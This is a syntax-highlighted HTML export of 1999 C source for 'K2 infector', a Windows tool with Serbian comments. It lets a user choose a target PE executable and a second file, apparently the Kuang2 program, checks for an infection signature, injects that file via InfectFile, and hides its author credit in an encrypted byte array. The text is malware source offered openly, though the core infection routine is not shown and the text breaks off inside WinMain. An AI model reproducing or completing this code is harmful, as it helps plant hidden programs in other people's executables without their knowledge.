<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">/***[ThuNderSoft]*************************************************************
                INFECTOR: program za inficiranje odreîenog fajla
                                   ver: 0.12
                                ˙˘ƒÕ WEIRD Õƒ˘˙
*****************************************************************************/</span><span class="sc0">

</span><span class="sc1">/* HISTORY */</span><span class="sc0">
</span><span class="sc2">// ver 0.12 (18-may-1999): dodata obaveÑtenja o greÑkama
// ver 0.10 (14-may-1999): born code
</span><span class="sc0">
</span><span class="sc9">#include &lt;windows.h&gt;
#include &lt;tools.h&gt;
#include "infector.h"
#pragma aux Wmain "_*"
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">addfile</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">IsFileInfect</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">InfectFile</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">kript</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">signature</span><span class="sc10">=&amp;</span><span class="sc11">kript</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">//char eporuka[]=" v1.0   by Weird  &lt;weird173@yahoo.com&gt;";
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">eporuka</span><span class="sc10">[]={</span><span class="sc0">
    </span><span class="sc4">0x65</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xFB</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xF5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x69</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xF0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xFC</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x95</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xEA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xC3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xAE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x1F</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x8D</span><span class="sc10">,\
</span><span class="sc0">    </span><span class="sc4">0x40</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x68</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xF7</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x16</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x53</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x53</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x2E</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x93</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x7F</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xE2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x3E</span><span class="sc10">,\
</span><span class="sc0">    </span><span class="sc4">0xEF</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x6A</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x6B</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x0F</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x69</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x5B</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xCD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x4E</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x0C</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x1D</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xD9</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x1B</span><span class="sc10">,\
</span><span class="sc0">    </span><span class="sc4">0x4B</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x26</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x2A</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xAC</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x94</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x05</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xF2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xA9</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x85</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x79</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x5B</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x5A</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">coded</span><span class="sc10">[]=</span><span class="sc6">"Coded"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hDlg</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hThisInst</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc2">// handle na program
</span><span class="sc11">HICON</span><span class="sc0"> </span><span class="sc11">ikona</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ffiltar</span><span class="sc10">[]=</span><span class="sc6">"Executables\00*.exe\00All files\00*.*\00"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">fajl</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ftitle</span><span class="sc10">[]=</span><span class="sc6">"Open file"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">OPENFILENAME</span><span class="sc0"> </span><span class="sc11">ofn</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">OPENFILENAME</span><span class="sc10">),</span><span class="sc0">       </span><span class="sc2">// veliÅina ove strukture
</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">                       </span><span class="sc2">// vlasnik (kasnije)
</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc11">ffiltar</span><span class="sc10">,</span><span class="sc0">                    </span><span class="sc2">// filter linija
</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">                 </span><span class="sc2">// custom filtars
</span><span class="sc0">    </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc11">fajl</span><span class="sc10">,</span><span class="sc0">                       </span><span class="sc2">// REZULTAT
</span><span class="sc0">    </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0">                   </span><span class="sc2">// max slova za fajl
</span><span class="sc0">    </span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">                       </span><span class="sc2">// inicijalni direktorijum
</span><span class="sc0">    </span><span class="sc11">ftitle</span><span class="sc10">,</span><span class="sc0">                     </span><span class="sc2">// Title za Open dijalog
</span><span class="sc0">    </span><span class="sc11">OFN_FILEMUSTEXIST</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">OFN_HIDEREADONLY</span><span class="sc10">,</span><span class="sc0">       </span><span class="sc2">// flagovi
</span><span class="sc0">    </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">                          </span><span class="sc2">// fajl ofset
</span><span class="sc0">    </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">                          </span><span class="sc2">// fajl extenzija ofset
</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">                       </span><span class="sc2">// default extenzija
</span><span class="sc0">    </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc11">hDlg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"K2 infector"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">MB_TOPMOST</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">MB_ICONERROR</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*
    InfLoop
    --------
  ˛ Obrada poruka za dijalog. */</span><span class="sc0">

</span><span class="sc11">LRESULT</span><span class="sc0"> </span><span class="sc11">CALLBACK</span><span class="sc0"> </span><span class="sc11">InfLoop</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WPARAM</span><span class="sc0"> </span><span class="sc11">wParam</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPARAM</span><span class="sc0"> </span><span class="sc11">lParam</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">msg</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">WM_INITDIALOG</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc2">// inicijalizacija dialoga PRE nego Ñto se dijalog otvori
</span><span class="sc0">            </span><span class="sc11">hDlg</span><span class="sc10">=</span><span class="sc11">hd</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">signature</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0x4C</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">rdecrypt</span><span class="sc10">(</span><span class="sc11">eporuka</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">eporuka</span><span class="sc10">);</span><span class="sc0">                     </span><span class="sc2">// dekriptuj eporuku
</span><span class="sc0">            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">eporuka</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc11">coded</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">      </span><span class="sc2">// dodaj reÅ 'coded'
</span><span class="sc0">            </span><span class="sc11">SetDlgItemText</span><span class="sc10">(</span><span class="sc11">hDlg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ID_INFO</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">eporuka</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">     </span><span class="sc2">// ispiÑi poruku
</span><span class="sc0">            </span><span class="sc11">SendDlgItemMessage</span><span class="sc10">(</span><span class="sc11">hDlg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ID_EDIT1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">EM_SETLIMITTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">// ograniÅi edit box sadrÇaj
</span><span class="sc0">            </span><span class="sc11">SendDlgItemMessage</span><span class="sc10">(</span><span class="sc11">hDlg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ID_EDIT2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">EM_SETLIMITTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">// ograniÅi edit box sadrÇaj
</span><span class="sc0">            </span><span class="sc11">ikona</span><span class="sc10">=</span><span class="sc11">LoadIcon</span><span class="sc10">(</span><span class="sc11">hThisInst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AAA"</span><span class="sc10">);</span><span class="sc0">               </span><span class="sc2">// uÅitaj ikonu programa
</span><span class="sc0">            </span><span class="sc11">SendMessage</span><span class="sc10">(</span><span class="sc11">hDlg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WM_SETICON</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ICON_BIG</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPARAM</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ikona</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc2">// setuj ikonu za program
</span><span class="sc0">            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">            </span><span class="sc2">// WM_INITDIALOG mora da vrati TRUE
</span><span class="sc0">
        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">WM_SYSCOMMAND</span><span class="sc10">:</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wParam</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SC_CLOSE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">           </span><span class="sc2">// pritisnuto 'x' dugme za kraj
</span><span class="sc0">                </span><span class="sc11">DestroyIcon</span><span class="sc10">(</span><span class="sc11">ikona</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">EndDialog</span><span class="sc10">(</span><span class="sc11">hDlg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">          </span><span class="sc2">// zatvori dijalog
</span><span class="sc0">                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">WM_COMMAND</span><span class="sc10">:</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HIWORD</span><span class="sc10">(</span><span class="sc11">wParam</span><span class="sc10">)==</span><span class="sc11">BN_CLICKED</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LOWORD</span><span class="sc10">(</span><span class="sc11">wParam</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">ID_BUTTON1</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc11">fajl</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">GetOpenFileName</span><span class="sc10">(&amp;</span><span class="sc11">ofn</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">SendDlgItemMessage</span><span class="sc10">(</span><span class="sc11">hDlg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ID_EDIT1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WM_SETTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPARAM</span><span class="sc10">)</span><span class="sc11">fajl</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">ID_BUTTON2</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc11">fajl</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">GetOpenFileName</span><span class="sc10">(&amp;</span><span class="sc11">ofn</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">SendDlgItemMessage</span><span class="sc10">(</span><span class="sc11">hDlg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ID_EDIT2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WM_SETTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPARAM</span><span class="sc10">)</span><span class="sc11">fajl</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">ID_INFECT</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"This will infect file!\r\n\r\nDo you want to continue?"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"K2 infector"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_YESNO</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">MB_ICONQUESTION</span><span class="sc10">)==</span><span class="sc11">IDYES</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">SendDlgItemMessage</span><span class="sc10">(</span><span class="sc11">hDlg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ID_EDIT1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WM_GETTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPARAM</span><span class="sc10">)</span><span class="sc11">fajl</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">SendDlgItemMessage</span><span class="sc10">(</span><span class="sc11">hDlg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ID_EDIT2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WM_GETTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPARAM</span><span class="sc10">)</span><span class="sc11">temp</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc2">// prvo proveri da li je fajl zaraÇen
</span><span class="sc0">                            </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">IsFileInfect</span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">signature</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">==-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: can't determine if file is infected!"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: file is already infected!"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">

                            </span><span class="sc2">// nije zaraÇen - zarazi ga:)
</span><span class="sc0">                            </span><span class="sc11">addfile</span><span class="sc10">=</span><span class="sc11">temp</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">InfectFile</span><span class="sc10">(</span><span class="sc11">fajl</span><span class="sc10">)){</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: can't open the file."</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0x11</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: invalid file size."</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0x12</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: can't create file mapping."</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0x13</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: can't MapView file."</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0x101</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: file is not a executable."</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0x102</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: file is not Windows PE EXE."</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0x103</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: file is not for GUI."</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0x105</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: can't find IMPORT section."</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0x106</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: can't find IMPORT table."</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0x108</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: can't find GetModuleHandle KERNEL32 import."</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0x10A</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">errorme</span><span class="sc10">(</span><span class="sc6">"ERROR: can't open virus file."</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">:</span><span class="sc0">
                                    </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc11">hd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"File infected OK!"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"K2 infector"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">MB_ICONASTERISK</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/*
    WinMain
    --------
  ˛ Inficira odreîeni fajl!
  ˛ parametri su: &lt;ime_fajla_za_inficiranje&gt; &lt;ime_kuang2_fajla&gt; */</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Wmain</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">CmdLine</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// inicijalizacija
</span><span class="sc0">    </span><span class="sc11">hThisInst</span><span class="sc10">=</span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">    </span><span class="sc2">// preuzmi handle ove aplikacije
</span><span class="sc0">    </span><span class="sc11">CmdLine</span><span class="sc10">=</span><span class="sc11">GetCommandLine</span><span class="sc10">();</span><span class="sc0">           </span><span class="sc2">// preuzmi komandnu liniju
</span><span class="sc0">
    </span><span class="sc2">// startuj
